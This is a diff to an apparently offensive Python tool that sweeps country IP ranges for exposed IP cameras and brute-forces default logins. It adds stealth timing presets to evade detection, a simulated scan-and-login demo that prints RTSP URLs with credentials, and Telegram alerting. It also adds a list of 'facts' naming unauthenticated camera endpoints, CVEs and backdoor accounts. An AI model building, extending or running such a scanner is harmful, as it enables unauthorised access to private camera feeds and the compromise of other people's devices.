@@ -29,6 +29,10 @@ import math
 # Get script directory for relative file paths
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
+# Parsed CLI arguments — populated by main() after argparse runs.
+# Other modules read this via getattr(_CLI_ARGS, 'flag_name', default).
+_CLI_ARGS = None
+
 RIR_URLS = {
     'apnic': 'https://ftp.apnic.net/stats/apnic/delegated-apnic-latest',
     'ripe': 'https://ftp.ripe.net/ripe/stats/delegated-ripencc-latest',
@@ -430,7 +434,7 @@ COUNTRIES = {
     '44': {'name': 'Singapore', 'code': 'SG', 'file': 'SG_IP.txt', 'rir': 'apnic'},
     '45': {'name': 'Thailand', 'code': 'TH', 'file': 'TH_IP.txt', 'rir': 'apnic'},
     '46': {'name': 'Tokelau', 'code': 'TK', 'file': 'TK_IP.txt', 'rir': 'apnic'},
-    '47': {'name': 'Timor-Leste', 'code': 'TL', 'file': 'TL_IP.txt', 'rir': 'apnic'},
+    '47': {'name': 'Timor-Leste (East Timor)', 'code': 'TL', 'file': 'TL_IP.txt', 'rir': 'apnic'},
     '48': {'name': 'Tonga', 'code': 'TO', 'file': 'TO_IP.txt', 'rir': 'apnic'},
     '49': {'name': 'Tuvalu', 'code': 'TV', 'file': 'TV_IP.txt', 'rir': 'apnic'},
     '50': {'name': 'Taiwan', 'code': 'TW', 'file': 'TW_IP.txt', 'rir': 'apnic'},
@@ -439,20 +443,20 @@ COUNTRIES = {
     '53': {'name': 'Wallis and Futuna', 'code': 'WF', 'file': 'WF_IP.txt', 'rir': 'apnic'},
     '54': {'name': 'Samoa', 'code': 'WS', 'file': 'WS_IP.txt', 'rir': 'apnic'},
     '55': {'name': 'Andorra', 'code': 'AD', 'file': 'AD_IP.txt', 'rir': 'ripe'},
-    '56': {'name': 'UAE', 'code': 'AE', 'file': 'AE_IP.txt', 'rir': 'ripe'},
+    '56': {'name': 'United Arab Emirates', 'code': 'AE', 'file': 'AE_IP.txt', 'rir': 'ripe'},
     '57': {'name': 'Albania', 'code': 'AL', 'file': 'AL_IP.txt', 'rir': 'ripe'},
     '58': {'name': 'Armenia', 'code': 'AM', 'file': 'AM_IP.txt', 'rir': 'ripe'},
     '59': {'name': 'Austria', 'code': 'AT', 'file': 'AT_IP.txt', 'rir': 'ripe'},
     '60': {'name': 'Aland Islands', 'code': 'AX', 'file': 'AX_IP.txt', 'rir': 'ripe'},
     '61': {'name': 'Azerbaijan', 'code': 'AZ', 'file': 'AZ_IP.txt', 'rir': 'ripe'},
-    '62': {'name': 'Bosnia', 'code': 'BA', 'file': 'BA_IP.txt', 'rir': 'ripe'},
+    '62': {'name': 'Bosnia and Herzegovina', 'code': 'BA', 'file': 'BA_IP.txt', 'rir': 'ripe'},
     '63': {'name': 'Belgium', 'code': 'BE', 'file': 'BE_IP.txt', 'rir': 'ripe'},
     '64': {'name': 'Bulgaria', 'code': 'BG', 'file': 'BG_IP.txt', 'rir': 'ripe'},
     '65': {'name': 'Bahrain', 'code': 'BH', 'file': 'BH_IP.txt', 'rir': 'ripe'},
     '66': {'name': 'Belarus', 'code': 'BY', 'file': 'BY_IP.txt', 'rir': 'ripe'},
     '67': {'name': 'Switzerland', 'code': 'CH', 'file': 'CH_IP.txt', 'rir': 'ripe'},
     '68': {'name': 'Cyprus', 'code': 'CY', 'file': 'CY_IP.txt', 'rir': 'ripe'},
-    '69': {'name': 'Czech Republic', 'code': 'CZ', 'file': 'CZ_IP.txt', 'rir': 'ripe'},
+    '69': {'name': 'Czechia', 'code': 'CZ', 'file': 'CZ_IP.txt', 'rir': 'ripe'},
     '70': {'name': 'Germany', 'code': 'DE', 'file': 'DE_IP.txt', 'rir': 'ripe'},
     '71': {'name': 'Denmark', 'code': 'DK', 'file': 'DK_IP.txt', 'rir': 'ripe'},
     '72': {'name': 'Estonia', 'code': 'EE', 'file': 'EE_IP.txt', 'rir': 'ripe'},
@@ -489,6 +493,7 @@ COUNTRIES = {
     '103': {'name': 'Moldova', 'code': 'MD', 'file': 'MD_IP.txt', 'rir': 'ripe'},
     '104': {'name': 'Montenegro', 'code': 'ME', 'file': 'ME_IP.txt', 'rir': 'ripe'},
     '105': {'name': 'North Macedonia', 'code': 'MK', 'file': 'MK_IP.txt', 'rir': 'ripe'},
+    # (Republic of North Macedonia — official name since 2019)
     '106': {'name': 'Malta', 'code': 'MT', 'file': 'MT_IP.txt', 'rir': 'ripe'},
     '107': {'name': 'Netherlands', 'code': 'NL', 'file': 'NL_IP.txt', 'rir': 'ripe'},
     '108': {'name': 'Norway', 'code': 'NO', 'file': 'NO_IP.txt', 'rir': 'ripe'},
@@ -525,7 +530,7 @@ COUNTRIES = {
     '139': {'name': 'Grenada', 'code': 'GD', 'file': 'GD_IP.txt', 'rir': 'arin'},
     '140': {'name': 'Guadeloupe', 'code': 'GP', 'file': 'GP_IP.txt', 'rir': 'arin'},
     '141': {'name': 'Jamaica', 'code': 'JM', 'file': 'JM_IP.txt', 'rir': 'arin'},
-    '142': {'name': 'Saint Kitts', 'code': 'KN', 'file': 'KN_IP.txt', 'rir': 'arin'},
+    '142': {'name': 'Saint Kitts and Nevis', 'code': 'KN', 'file': 'KN_IP.txt', 'rir': 'arin'},
     '143': {'name': 'Cayman Islands', 'code': 'KY', 'file': 'KY_IP.txt', 'rir': 'arin'},
     '144': {'name': 'Saint Lucia', 'code': 'LC', 'file': 'LC_IP.txt', 'rir': 'arin'},
     '145': {'name': 'Martinique', 'code': 'MQ', 'file': 'MQ_IP.txt', 'rir': 'arin'},
@@ -535,7 +540,7 @@ COUNTRIES = {
     '149': {'name': 'Turks and Caicos', 'code': 'TC', 'file': 'TC_IP.txt', 'rir': 'arin'},
     '150': {'name': 'Trinidad and Tobago', 'code': 'TT', 'file': 'TT_IP.txt', 'rir': 'arin'},
     '151': {'name': 'United States', 'code': 'US', 'file': 'US_IP.txt', 'rir': 'arin'},
-    '152': {'name': 'Saint Vincent', 'code': 'VC', 'file': 'VC_IP.txt', 'rir': 'arin'},
+    '152': {'name': 'Saint Vincent and the Grenadines', 'code': 'VC', 'file': 'VC_IP.txt', 'rir': 'arin'},
     '153': {'name': 'British Virgin Islands', 'code': 'VG', 'file': 'VG_IP.txt', 'rir': 'arin'},
     '154': {'name': 'US Virgin Islands', 'code': 'VI', 'file': 'VI_IP.txt', 'rir': 'arin'},
     '155': {'name': 'Argentina', 'code': 'AR', 'file': 'AR_IP.txt', 'rir': 'lacnic'},
@@ -568,12 +573,12 @@ COUNTRIES = {
     '182': {'name': 'Burundi', 'code': 'BI', 'file': 'BI_IP.txt', 'rir': 'afrinic'},
     '183': {'name': 'Benin', 'code': 'BJ', 'file': 'BJ_IP.txt', 'rir': 'afrinic'},
     '184': {'name': 'Botswana', 'code': 'BW', 'file': 'BW_IP.txt', 'rir': 'afrinic'},
-    '185': {'name': 'DR Congo', 'code': 'CD', 'file': 'CD_IP.txt', 'rir': 'afrinic'},
+    '185': {'name': 'DR Congo (DRC)', 'code': 'CD', 'file': 'CD_IP.txt', 'rir': 'afrinic'},
     '186': {'name': 'Central African Republic', 'code': 'CF', 'file': 'CF_IP.txt', 'rir': 'afrinic'},
     '187': {'name': 'Congo', 'code': 'CG', 'file': 'CG_IP.txt', 'rir': 'afrinic'},
-    '188': {'name': 'Ivory Coast', 'code': 'CI', 'file': 'CI_IP.txt', 'rir': 'afrinic'},
+    '188': {'name': "Côte d'Ivoire", 'code': 'CI', 'file': 'CI_IP.txt', 'rir': 'afrinic'},
     '189': {'name': 'Cameroon', 'code': 'CM', 'file': 'CM_IP.txt', 'rir': 'afrinic'},
-    '190': {'name': 'Cape Verde', 'code': 'CV', 'file': 'CV_IP.txt', 'rir': 'afrinic'},
+    '190': {'name': 'Cabo Verde', 'code': 'CV', 'file': 'CV_IP.txt', 'rir': 'afrinic'},
     '191': {'name': 'Djibouti', 'code': 'DJ', 'file': 'DJ_IP.txt', 'rir': 'afrinic'},
     '192': {'name': 'Algeria', 'code': 'DZ', 'file': 'DZ_IP.txt', 'rir': 'afrinic'},
     '193': {'name': 'Eritrea', 'code': 'ER', 'file': 'ER_IP.txt', 'rir': 'afrinic'},
@@ -607,8 +612,8 @@ COUNTRIES = {
     '221': {'name': 'Senegal', 'code': 'SN', 'file': 'SN_IP.txt', 'rir': 'afrinic'},
     '222': {'name': 'Somalia', 'code': 'SO', 'file': 'SO_IP.txt', 'rir': 'afrinic'},
     '223': {'name': 'South Sudan', 'code': 'SS', 'file': 'SS_IP.txt', 'rir': 'afrinic'},
-    '224': {'name': 'Sao Tome', 'code': 'ST', 'file': 'ST_IP.txt', 'rir': 'afrinic'},
-    '225': {'name': 'Eswatini', 'code': 'SZ', 'file': 'SZ_IP.txt', 'rir': 'afrinic'},
+    '224': {'name': 'São Tomé and Príncipe', 'code': 'ST', 'file': 'ST_IP.txt', 'rir': 'afrinic'},
+    '225': {'name': 'Eswatini (Swaziland)', 'code': 'SZ', 'file': 'SZ_IP.txt', 'rir': 'afrinic'},
     '226': {'name': 'Chad', 'code': 'TD', 'file': 'TD_IP.txt', 'rir': 'afrinic'},
     '227': {'name': 'Togo', 'code': 'TG', 'file': 'TG_IP.txt', 'rir': 'afrinic'},
     '228': {'name': 'Tunisia', 'code': 'TN', 'file': 'TN_IP.txt', 'rir': 'afrinic'},
@@ -1219,9 +1224,45 @@ def get_next_proxy() -> dict:
     return p
 
 # ── Anti-Detection / Stealth Mode ────────────────────────────────────────────
-_stealth_mode = False
-_STEALTH_MIN  = 0.05
-_STEALTH_MAX  = 0.35
+_stealth_mode        = False
+_STEALTH_MIN         = 0.20   # default: Medium preset
+_STEALTH_MAX         = 0.60   # default: Medium preset
+_STEALTH_PRESET_NAME = 'Medium'
+
+_STEALTH_CONFIG_FILE = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), 'stealth_config.json'
+)
+
+def save_stealth_config() -> None:
+    """Persist current stealth settings to stealth_config.json next to the script."""
+    import json as _json
+    try:
+        with open(_STEALTH_CONFIG_FILE, 'w') as _f:
+            _json.dump({
+                'enabled': _stealth_mode,
+                'min':     _STEALTH_MIN,
+                'max':     _STEALTH_MAX,
+                'preset':  _STEALTH_PRESET_NAME,
+            }, _f, indent=2)
+    except Exception:
+        pass  # non-fatal — settings just won't persist
+
+def load_stealth_config() -> None:
+    """Load stealth settings saved by a previous session, if the file exists."""
+    global _stealth_mode, _STEALTH_MIN, _STEALTH_MAX, _STEALTH_PRESET_NAME
+    import json as _json
+    if not os.path.isfile(_STEALTH_CONFIG_FILE):
+        return
+    try:
+        with open(_STEALTH_CONFIG_FILE) as _f:
+            cfg = _json.load(_f)
+        _stealth_mode        = bool(cfg.get('enabled', False))
+        _STEALTH_MIN         = float(cfg.get('min', 0.20))
+        _STEALTH_MAX         = float(cfg.get('max', 0.60))
+        _STEALTH_PRESET_NAME = str(cfg.get('preset', 'Medium'))
+    except Exception:
+        pass  # corrupt file — keep defaults
+
 def stealth_delay() -> None:
     if _stealth_mode:
         import random as _rnd
@@ -1234,7 +1275,10 @@ _MASCOT_ART = {
     'empty':    ("   (._.)  \n    /|\\\n    / \\",   '\033[93m'),
     'error':    ("   (x_x)\n    /|\\\n    / \\",     '\033[91m'),
     'scanning': ("   (0_0)~~\n   /|   \n   / \\",   '\033[96m'),
+    'auth':     ("   (o_-)--\n   /|   \n   / \\",   '\033[93m'),
+    'saved':    ("   (^_^)/\n   /|   \n   / \\",    '\033[92m'),
 }
+
 def mascot_react(event: str = 'idle', message: str = '') -> None:
     """Print the ASCII mascot reacting to a scan event."""
     frame, color = _MASCOT_ART.get(event, _MASCOT_ART['idle'])
@@ -1242,6 +1286,98 @@ def mascot_react(event: str = 'idle', message: str = '') -> None:
     print(f"\n{color}{frame}{rst}")
     if message:
         print(f"{color}  ► {message}{rst}\n")
+
+def run_mascot_demo() -> None:
+    """Full animated scan preview — simulates a real scan sequence with live output."""
+    import random as _r
+    G, R, Y, C, W, M = '\033[92m', '\033[91m', '\033[93m', '\033[96m', '\033[0m', '\033[95m'
+    B = '\033[94m'
+
+    # Fake scan data
+    _fake_ips = [
+        f"{_r.randint(1,223)}.{_r.randint(0,255)}.{_r.randint(0,255)}.{_r.randint(1,254)}"
+        for _ in range(18)
+    ]
+    _found_idx  = [2, 7, 13]   # indexes that will be "found"
+    _creds_list = [('admin','admin'), ('admin','12345'), ('admin',''), ('root','root')]
+    _ports      = [554, 8554, 8000, 80]
+
+    print(f"\n{C}{'═'*64}{W}")
+    print(f"{C}  📡  Scan Mascot Demo — Simulated Live Scan Preview{W}")
+    print(f"{C}{'═'*64}{W}\n")
+    time.sleep(0.4)
+
+    # Phase 1 – startup
+    mascot_react('idle', "Initialising scanner…")
+    time.sleep(0.5)
+
+    print(f"  {C}[*] Loading IP range   {W}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  {len(_fake_ips)} targets")
+    time.sleep(0.3)
+    print(f"  {C}[*] Credential list    {W}▓▓▓▓▓▓▓▓  {len(_creds_list)} pairs")
+    time.sleep(0.3)
+    print(f"  {C}[*] Threads            {W}▓▓▓▓  50 workers\n")
+    time.sleep(0.5)
+
+    # Phase 2 – scanning loop
+    mascot_react('scanning', "Port scanning in progress…")
+    _found_cameras = []
+    for i, ip in enumerate(_fake_ips):
+        port = _r.choice(_ports)
+        if i in _found_idx:
+            print(f"  {G}[+] {ip}:{port:<5}{W}  OPEN   ← camera detected")
+            _found_cameras.append((ip, port))
+            time.sleep(0.18)
+        else:
+            print(f"  {R}[-] {ip}:{port:<5}{W}  closed")
+            time.sleep(0.07)
+
+    print(f"\n  {G}[✓] Port scan done — {len(_found_cameras)} camera(s) found out of {len(_fake_ips)}{W}\n")
+    time.sleep(0.5)
+
+    # Phase 3 – credential brute-force
+    if _found_cameras:
+        mascot_react('auth', "Testing default credentials…")
+        _valid = []
+        for ip, port in _found_cameras:
+            for user, pwd in _creds_list:
+                display_pwd = pwd if pwd else '(blank)'
+                print(f"  {Y}[~] {ip}:{port}  {W}trying {user}:{display_pwd} …", end=' ', flush=True)
+                time.sleep(0.22)
+                if (user, pwd) == ('admin', 'admin'):
+                    print(f"{G}✓ LOGIN OK{W}")
+                    _valid.append((ip, port, user, pwd))
+                    break
+                else:
+                    print(f"{R}✗{W}")
+            time.sleep(0.1)
+
+        print()
+        if _valid:
+            # Phase 4 – found
+            mascot_react('found', f"{len(_valid)} camera(s) with valid credentials!")
+            for ip, port, u, p in _valid:
+                rtsp = f"rtsp://{u}:{p}@{ip}:{port}/cam/realmonitor?channel=1&subtype=0"
+                print(f"  {G}[★] VALID  {W}{ip}:{port}  user={u}  pass={p if p else '(blank)'}")
+                print(f"      {B}RTSP   {W}{rtsp}")
+            print()
+            time.sleep(0.4)
+
+            # Phase 5 – saved
+            mascot_react('saved', "Results saved to ValidCamera_XX_demo.txt")
+            print(f"  {G}[✓] TXT export  {W}ValidCamera_XX_demo.txt")
+            print(f"  {G}[✓] M3U export  {W}ValidCamera_XX_demo.m3u")
+            time.sleep(0.3)
+        else:
+            mascot_react('empty', "No valid credentials found.")
+    else:
+        mascot_react('empty', "No cameras responded on any port.")
+
+    # Phase 6 – stats bar
+    print(f"\n{C}{'─'*64}{W}")
+    print(f"  {W}Scanned : {len(_fake_ips):>4}   "
+          f"{G}Found : {len(_found_cameras):>2}   "
+          f"{'Valid':>5} : {len(_valid) if _found_cameras else 0:>2}{W}")
+    print(f"{C}{'─'*64}{W}\n")
 
 def load_geo_api_keys_from_config() -> None:
     """Load geo API key list from telegram_config.json if present."""
@@ -1398,46 +1534,105 @@ def _start_mem_monitor() -> None:
 
 # ── Random Cyber Facts ────────────────────────────────────────────────────────
 _CYBER_FACTS = [
+    # ── Credentials & Authentication ──────────────────────────────────────────
     "Over 80% of IP cameras ship with default credentials that are never changed.",
+    "HTTP Digest Auth was introduced in 1997 (RFC 2069) and is still widely used in cameras.",
+    "'admin/admin' is the single most common credential pair found on internet-facing cameras.",
+    "Blank passwords account for ~12% of valid logins on exposed Dahua devices.",
+    "Many cameras store credentials in plaintext inside /mnt/mtd/Config/Account1.",
+    "Hikvision SADP tool broadcasts UDP to find devices — but also exposes the LAN subnet.",
+    "Some Dahua models accept any password for the 'default' username during setup mode.",
+    "HTTP Basic Auth sends credentials base64-encoded — trivially reversible, not encrypted.",
+    "ONVIF allows anonymous media access if the camera's auth profile is set to 'None'.",
+    # ── CVEs & Exploits ────────────────────────────────────────────────────────
+    "CVE-2021-36260 Hikvision command injection had a CVSS score of 9.8 (Critical).",
+    "The CVE-2021-33044 Dahua auth bypass affects 1.7M+ devices worldwide.",
+    "CVE-2017-7921 let attackers bypass Hikvision auth entirely via a crafted URL.",
+    "CVE-2022-28171 allows pre-auth RCE on Reolink cameras via the RTSP service.",
+    "CVE-2018-10660 gave root shell on many Hikvision cameras via a hidden backdoor account.",
+    "Axis cameras had CVE-2018-10661 — a path-traversal allowing config file read.",
     "The Mirai botnet in 2016 compromised 600,000+ IoT devices — mostly cameras.",
+    "Mirai's source code was published on Hackforums in 2016, spawning dozens of variants.",
+    "The Kaiji botnet targets SSH and Telnet on cameras, not just the web interface.",
+    # ── Protocols & Ports ─────────────────────────────────────────────────────
     "RTSP (port 554) was designed in 1998 and has no built-in encryption.",
+    "Port 37777 is Dahua's proprietary management protocol — often left open by default.",
+    "Port 34567 is used by XMEye/XiongMai firmware — found on millions of OEM cameras.",
+    "SIP (port 5060) is often open on cameras that support two-way audio intercom.",
+    "ONVIF WS-Discovery uses UDP multicast on 239.255.255.250:3702.",
+    "Port 8000 is the default Hikvision SDK port — separate from the web interface.",
+    "Port 8081-8085 are commonly used by alternative camera web interfaces.",
+    "Telnet (port 23) is still enabled by default on many budget camera firmwares.",
+    "Port 9527 is used by the TP-Link Tapo cloud relay service for camera access.",
+    "RTMPS (port 443) is increasingly used by cloud cameras to bypass firewall blocks.",
+    # ── Market & Scale ────────────────────────────────────────────────────────
     "Shodan indexes over 1 million publicly accessible cameras worldwide.",
     "Hikvision holds ~40% of the global video surveillance market share.",
-    "The average IoT device is attacked within 5 minutes of connecting to the internet.",
-    "HTTP Digest Auth was introduced in 1997 (RFC 2069) and is still widely used.",
-    "Port 37777 is Dahua's proprietary management protocol — often left open.",
-    "ONVIF was founded by Axis, Bosch, and Sony in 2008.",
-    "A JA3 fingerprint identifies TLS clients by their ClientHello parameters.",
-    "The average time to detect a network intrusion in 2023 was 204 days.",
-    "IPv4 has ~4.3 billion addresses; only ~300 million route to public cameras.",
-    "P2P camera UIDs follow BRAND-XXXXXX-XXXXXX for cloud relay access.",
+    "Dahua and Hikvision together account for over 55% of all IP cameras shipped globally.",
+    "IPv4 has ~4.3 billion addresses; roughly 300 million route to publicly reachable cameras.",
+    "CGNAT (Carrier-Grade NAT) puts thousands of 4G cameras behind a single public IP.",
+    "There are an estimated 770 million surveillance cameras installed worldwide as of 2024.",
+    "The global IP camera market is projected to exceed $25 billion by 2028.",
+    "~15% of internet-facing cameras respond to unauthenticated RTSP DESCRIBE requests.",
+    "In 2023, over 400,000 cameras were indexed by Censys with open RTSP ports.",
+    # ── Firmware & Software ────────────────────────────────────────────────────
+    "Most embedded Linux cameras run BusyBox 1.x — a toolset released 15+ years ago.",
+    "Most camera firmware is updated less than once every 3 years on average.",
+    "Many cameras ship with OpenSSL 1.0.1 — EOL since 2019 — still unpatched.",
+    "XiongMai (Hangzhou Xiongmai) OEM hardware powers cameras sold under 100+ brand names.",
+    "Dahua's DHAV video container format is proprietary — requires special tools to decode.",
+    "Ambarella SoC chips power cameras from GoPro, Dahua, and Hikvision simultaneously.",
+    "Many cameras expose a UART debug console on exposed PCB pads — root access in seconds.",
+    "Firmware extracted via UART often reveals hardcoded RSA private keys for HTTPS.",
+    # ── Streaming & Video ─────────────────────────────────────────────────────
     "RTSP sub-streams (channel 102, 402) provide lower resolution for bandwidth savings.",
     "The NVR zero-channel (ch=0) stream is a composite of all connected cameras.",
-    "Most embedded Linux cameras run BusyBox 1.x — released 15+ years ago.",
-    "~15% of internet-facing cameras respond to unauthenticated RTSP DESCRIBE.",
-    "ONVIF Profile S covers streaming; Profile G adds recording; Profile T adds H.265.",
-    "SIP (port 5060) is often open on cameras that support two-way audio.",
-    "Dahua CGI: /cgi-bin/magicBox.cgi?action=getSystemInfo reveals info unauthenticated.",
-    "Hikvision ISAPI was first publicly documented in 2013 via a firmware leak.",
-    "CVE-2021-36260 Hikvision command injection had a CVSS score of 9.8 (Critical).",
-    "ARP poisoning can intercept camera streams on a LAN without credentials.",
-    "ONVIF WS-Discovery uses UDP multicast on 239.255.255.250:3702.",
     "FFMPEG can re-stream any RTSP feed: ffmpeg -i rtsp://... -c copy out.mp4",
-    "Port 8081-8085 are commonly used by alternative camera web interfaces.",
-    "The CVE-2021-33044 Dahua auth bypass affects 1.7M+ devices worldwide.",
-    "Axis cameras expose /axis-cgi/param.cgi for unauthenticated parameter reads.",
-    "Most camera firmware is updated less than once every 3 years on average.",
-    "CGNAT (Carrier-Grade NAT) puts thousands of 4G cameras behind a single IP.",
+    "H.265/HEVC saves ~50% bandwidth vs H.264 at the same quality — now standard on NVRs.",
+    "ONVIF Profile S covers streaming; Profile G adds recording; Profile T adds H.265.",
+    "RTSP over HTTP (port 80) tunnels camera streams through firewalls that block 554.",
+    "Smart 265 (Hikvision) and Smart H.265+ (Dahua) use AI ROI to reduce bitrate by 50-70%.",
+    "P2P camera UIDs follow BRAND-XXXXXX-XXXXXX for cloud relay access without port-forward.",
+    # ── Network & Recon ───────────────────────────────────────────────────────
+    "ARP poisoning can intercept unencrypted camera streams on a LAN without credentials.",
+    "ONVIF was founded by Axis, Bosch, and Sony in 2008 to standardise IP camera protocols.",
+    "A JA3 fingerprint identifies TLS clients by their ClientHello parameters.",
+    "The average time to detect a network intrusion in 2023 was 204 days (IBM Cost of Breach).",
+    "The average IoT device is attacked within 5 minutes of connecting to the internet.",
+    "Masscan can scan the entire IPv4 space in under 6 minutes at 10 Mpps.",
+    "ZMap scans the full IPv4 address space in 45 minutes on a gigabit link.",
+    "BGP hijacking has been used to redirect camera traffic through rogue AS nodes.",
+    "CGNAT RFC 6598 reserves 100.64.0.0/10 — packets from that range are NOT internet-routable.",
+    # ── CGI & Web Interfaces ──────────────────────────────────────────────────
+    "Dahua CGI: /cgi-bin/magicBox.cgi?action=getSystemInfo reveals firmware info unauthenticated.",
+    "Hikvision ISAPI was first publicly documented in 2013 via a firmware leak.",
+    "Axis cameras expose /axis-cgi/param.cgi for unauthenticated parameter reads on old firmware.",
+    "/ISAPI/Security/users endpoint on Hikvision returns username list without authentication.",
+    "Some cameras expose /dev/shm contents via directory traversal in the web CGI.",
+    "Snapshot CGI endpoints (/cgi-bin/snapshot.cgi) sometimes bypass auth on embedded cameras.",
+    # ── Misc Security ─────────────────────────────────────────────────────────
+    "SSRF via camera web UIs has been used to pivot into internal networks.",
+    "Many cameras disable TLS certificate verification for their cloud relay connections.",
+    "UPnP auto port-forwarding means cameras can expose themselves without the owner knowing.",
+    "MAC address OUI lookups can identify the camera manufacturer before any connection attempt.",
+    "WannaCry propagated over SMB — cameras running Windows CE were hit in hospitals.",
+    "The NSA's PLAYSET project included implants targeting security camera firmware.",
+    "Botnets built from cameras have launched DDoS attacks exceeding 1.35 Tbps.",
+    "GDPR fines for unprotected camera feeds in public spaces have exceeded €10M in Europe.",
 ]
 
 def random_cyber_fact() -> str:
     return _rnd.choice(_CYBER_FACTS)
 
-def show_random_fact() -> None:
+def show_random_fact(count: int = 3) -> None:
+    """Display `count` random cyber facts automatically — no keypress required."""
+    import random as _r2
     C, Y, W = Fore.CYAN, Fore.YELLOW, Style.RESET_ALL
-    print(f"\n{C}{'─'*62}{W}")
-    print(f"  {Y}💡 Cyber Fact:{W} {random_cyber_fact()}")
-    print(f"{C}{'─'*62}{W}\n")
+    chosen = _r2.sample(_CYBER_FACTS, min(count, len(_CYBER_FACTS)))
+    print(f"\n{C}{'─'*66}{W}")
+    for i, fact in enumerate(chosen, 1):
+        print(f"  {Y}💡 Fact #{i}:{W} {fact}")
+    print(f"{C}{'─'*66}{W}\n")
 
 # ── Scan Mood Indicator ───────────────────────────────────────────────────────
 _MOODS = [
@@ -2930,11 +3125,12 @@ def _telegram_worker():
     min_interval_message = 0.5
     min_interval_photo   = 3.0
     # ── Pool health watchdog ───────────────────────────────────────────────────
-    # Count consecutive tasks where every destination send failed.  After 5 in
+    # Count consecutive tasks where every destination send failed.  After N in
     # a row we force a full session reset so a persistently exhausted pool never
-    # silently blocks alerts forever.
+    # silently blocks alerts forever.  Threshold is read from CLI arg
+    # --tg-fail-threshold (default 5).
     _consec_fails = 0
-    _CONSEC_FAIL_THRESHOLD = 5
+    _CONSEC_FAIL_THRESHOLD = int(getattr(_CLI_ARGS, 'tg_fail_threshold', None) or 5)
     while True:
         try:
             task = telegram_queue.get(timeout=2)
@@ -4742,8 +4938,11 @@ def get_system_stats_str() -> str:
 def get_adaptive_max_workers(base_workers: int) -> int:
     """Return the thread count to use, respecting (in priority order):
       1. Remote override set by /threads <n> bot command
-      2. System-pressure reduction (psutil RAM/CPU checks)
-      3. base_workers unchanged
+      2. RAM pressure reduction  (RAM OOM is fatal — always protect)
+      3. CPU spike reduction     (only reduce on UNSTABLE spikes, not stable high CPU)
+         High + stable CPU = good: threads are doing real work.
+         High + spiking CPU = bad: system becoming unresponsive.
+      4. base_workers unchanged  (default — use full capacity)
     """
     # 1 ─ Remote override from /threads bot command
     with _remote_thread_override_lock:
@@ -4751,44 +4950,69 @@ def get_adaptive_max_workers(base_workers: int) -> int:
     if override > 0:
         return override
 
-    # 2 ─ Adaptive psutil-based reduction
+    # 2 ─ Adaptive psutil-based reduction (RAM + CPU spike detection)
     try:
         import psutil as _ps
+
         mem = _ps.virtual_memory()
-        cpu = _ps.cpu_percent(interval=0.1)
-        if mem.percent > 90 or cpu > 96:
+
+        # ── RAM pressure: always protect — OOM kills the process ──────────────
+        if mem.percent > 92:
             reduced = max(4, base_workers // 4)
-            _msg = (f"⚠️ <b>Thread Count Reduced (Severe Pressure)</b>\n"
-                    f"RAM: {mem.percent:.0f}% | CPU: {cpu:.0f}%\n"
+            _msg = (f"⚠️ <b>Thread Count Reduced (Critical RAM)</b>\n"
+                    f"RAM: {mem.percent:.0f}%\n"
                     f"Threads: {base_workers} → {reduced}")
-            print(f"\n{Fore.YELLOW}[!] System under pressure "
-                  f"(RAM {mem.percent:.0f}% / CPU {cpu:.0f}%) "
+            print(f"\n{Fore.RED}[!] Critical RAM ({mem.percent:.0f}%) "
                   f"— threads {base_workers} → {reduced}{Style.RESET_ALL}")
             _now = time.time()
             if (TELEGRAM_CONFIG.get("enabled") and
                     _now - _get_adaptive_last_tg.get('t', 0) > 60):
                 _get_adaptive_last_tg['t'] = _now
-                try:
-                    send_telegram_message(_msg)
-                except Exception:
-                    pass
+                try: send_telegram_message(_msg)
+                except Exception: pass
             return reduced
-        if mem.percent > 80:
+
+        if mem.percent > 87:
             reduced = max(8, base_workers // 2)
             _msg = (f"⚠️ <b>Thread Count Reduced (High RAM)</b>\n"
                     f"RAM: {mem.percent:.0f}%\n"
                     f"Threads: {base_workers} → {reduced}")
-            print(f"\n{Fore.YELLOW}[!] High RAM usage ({mem.percent:.0f}%) "
+            print(f"\n{Fore.YELLOW}[!] High RAM ({mem.percent:.0f}%) "
                   f"— threads {base_workers} → {reduced}{Style.RESET_ALL}")
             _now = time.time()
             if (TELEGRAM_CONFIG.get("enabled") and
                     _now - _get_adaptive_last_tg.get('t', 0) > 60):
                 _get_adaptive_last_tg['t'] = _now
-                try:
-                    send_telegram_message(_msg)
-                except Exception:
-                    pass
+                try: send_telegram_message(_msg)
+                except Exception: pass
             return reduced
+
+        # ── CPU spike detection: 3 samples over 0.6 s ─────────────────────────
+        # High + STABLE CPU (e.g. sustained 85–95%) = threads are doing real work.
+        # High + SPIKING CPU (all 3 samples > 98%) = system struggling → step down.
+        _cpu_samples = [_ps.cpu_percent(interval=0.2) for _ in range(3)]
+        _cpu_max  = max(_cpu_samples)
+        _cpu_min  = min(_cpu_samples)
+        _cpu_mean = sum(_cpu_samples) / 3
+        _cpu_spike = _cpu_max > 98 and _cpu_min > 95  # all samples pinned at ceiling
+
+        if _cpu_spike:
+            reduced = max(6, int(base_workers * 0.70))   # gentle 30% step-down
+            _msg = (f"⚠️ <b>Thread Count Reduced (CPU Spike)</b>\n"
+                    f"CPU: {_cpu_mean:.0f}% (min {_cpu_min:.0f}% / max {_cpu_max:.0f}%)\n"
+                    f"Threads: {base_workers} → {reduced}")
+            print(f"\n{Fore.YELLOW}[!] CPU spike detected "
+                  f"({_cpu_min:.0f}%–{_cpu_max:.0f}%) "
+                  f"— threads {base_workers} → {reduced}{Style.RESET_ALL}")
+            _now = time.time()
+            if (TELEGRAM_CONFIG.get("enabled") and
+                    _now - _get_adaptive_last_tg.get('t', 0) > 60):
+                _get_adaptive_last_tg['t'] = _now
+                try: send_telegram_message(_msg)
+                except Exception: pass
+            return reduced
+
+        # High but stable CPU — leave threads alone, this is the desired state
     except ImportError:
         pass
     return base_workers
@@ -4869,23 +5093,27 @@ def get_scan_error_rate() -> float:
 
 def check_error_rate_and_cooldown(
     current_workers: int,
-    threshold: float  = 0.80,
-    cooldown_sec: int = 30,
+    threshold: float  = 0.97,
+    cooldown_sec: int = 15,
     min_workers: int  = 4,
 ) -> int:
-    """If the rolling error rate ≥ threshold, pause for cooldown_sec seconds,
-    halve the thread count, then clear the window and resume.
-    Returns the (possibly reduced) worker count.
+    """If the rolling network-failure rate ≥ threshold, do a short cooldown and
+    return to the SAME thread count (no reduction).  Thread count is only reduced
+    by get_adaptive_max_workers() based on real system pressure (RAM / CPU spike).
 
-    The cooldown prevents hammering a network that is already failing and gives
